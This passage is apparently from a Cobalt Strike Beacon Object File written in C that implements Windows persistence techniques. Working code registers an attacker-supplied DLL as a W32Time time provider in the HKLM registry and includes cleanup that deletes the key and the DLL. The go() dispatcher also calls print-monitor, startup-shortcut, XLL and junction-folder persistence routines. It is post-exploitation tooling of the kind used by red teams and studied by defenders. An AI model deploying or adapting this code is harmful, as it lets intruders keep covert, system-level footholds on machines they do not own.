			BeaconPrintf(CALLBACK_ERROR, "RegCreateKeyExW has failed\n");
			ADVAPI32$RegCloseKey(phkResult);
			return FALSE;
		}
		else
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully created %ls\n", pFullKeyPath);

		WCHAR lpValueName[] = L"DllName";
		status = ADVAPI32$RegSetKeyValueW(HKEY_LOCAL_MACHINE, pFullKeyPath, lpValueName, REG_SZ, dllName, MSVCRT$wcslen(dllName) * 2 + 1);
		if (status)
		{
			BeaconPrintf(CALLBACK_ERROR, "RegSetKeyValueW Driver has failed\n");
			ADVAPI32$RegCloseKey(phkResult);
			return FALSE;
		}
		else
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully set DllName %ls\n", dllName);

		WCHAR lpValueName1[] = L"Enabled";
		DWORD lpData2 = 1;
		status = ADVAPI32$RegSetKeyValueW(HKEY_LOCAL_MACHINE, pFullKeyPath, lpValueName1, REG_DWORD, &lpData2, sizeof(DWORD));
		if (status)
		{
			BeaconPrintf(CALLBACK_ERROR, "RegSetKeyValueW Enabled has failed\n");
			ADVAPI32$RegCloseKey(phkResult);
			return FALSE;
		}

		WCHAR lpValueName2[] = L"InputProvider";
		status = ADVAPI32$RegSetKeyValueW(HKEY_LOCAL_MACHINE, pFullKeyPath, lpValueName2, REG_DWORD, &lpData2, sizeof(DWORD));
		if (status)
		{
			BeaconPrintf(CALLBACK_ERROR, "RegSetKeyValueW InputProvider has failedn");
			ADVAPI32$RegCloseKey(phkResult);
			return FALSE;
		}

		status = ADVAPI32$RegCloseKey(phkResult);
		if (status)
		{
			BeaconPrintf(CALLBACK_ERROR, "RegCloseKey has failed\n");
		}
	}
	else if (cmd == 1)
	{
		BOOL success = TRUE;
		status = ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, pFullKeyPath);
		if (status)
		{
			BeaconPrintf(CALLBACK_ERROR, "RegDeleteKey has failed\n");
			success = FALSE;
		}
		else
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", pFullKeyPath);

		if (!KERNEL32$DeleteFileW((LPCWSTR)dllName))
		{
			success = FALSE;
			BeaconPrintf(CALLBACK_ERROR, "Could not delete %ls, Error: %d\n", dllName, KERNEL32$GetLastError());
		}
		else
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", dllName);
		return success;
	}

	return TRUE;


}
#endif

void go(char* args, int length) {

	wchar_t* arg1 = NULL;
	wchar_t* arg2 = NULL;
	wchar_t* clsid = NULL;
	int sizeArg1 = 0;
	int sizeArg2 = 0;
	int sizeClsid = 0;
	DWORD arg = 0;
	datap  parser;

	BeaconDataParse(&parser, args, length);
	arg = BeaconDataInt(&parser);
	arg1 = (wchar_t*)BeaconDataExtract(&parser, &sizeArg1);
	arg2 = (wchar_t*)BeaconDataExtract(&parser, &sizeArg2);

	if (arg1 == NULL || arg2 == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "Arg parsing failed\n");
		return;
	}


#ifdef TIME

	wchar_t pFullKeyPath[512] = L"SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\";
	MSVCRT$wcscat(pFullKeyPath, arg1);

	if (!RegisterTimeProvider(arg, pFullKeyPath, arg2))
	{
		BeaconPrintf(CALLBACK_ERROR, "Something went wrong!\n");
		return;
	}

#endif
#ifdef PRINTMONITOR

	if (!PrintMonitorPersistence(arg, arg1, arg2))
	{
		BeaconPrintf(CALLBACK_ERROR, "Something went wrong!\n");
		return;
	}
#endif
#ifdef ShortCutStartup
	BuildShortCut(arg, arg1, arg2);

#endif

#ifdef XLL
	if(!XllSetup(arg, arg1, arg2))
	{
		BeaconPrintf(CALLBACK_ERROR, "Something went wrong!\n");
		return;
	}
#endif
#ifdef JUNCTION

	if(arg == 1)
	{
		clsid = (wchar_t*)BeaconDataExtract(&parser, &sizeClsid);
	}

	if (!JunctionFolder(arg, arg1, arg2, clsid))
	{
		BeaconPrintf(CALLBACK_ERROR, "Something went wrong!\n");
		return;
	}
#endif
	BeaconPrintf(CALLBACK_OUTPUT, "[*] Success!\n");
	return;
}

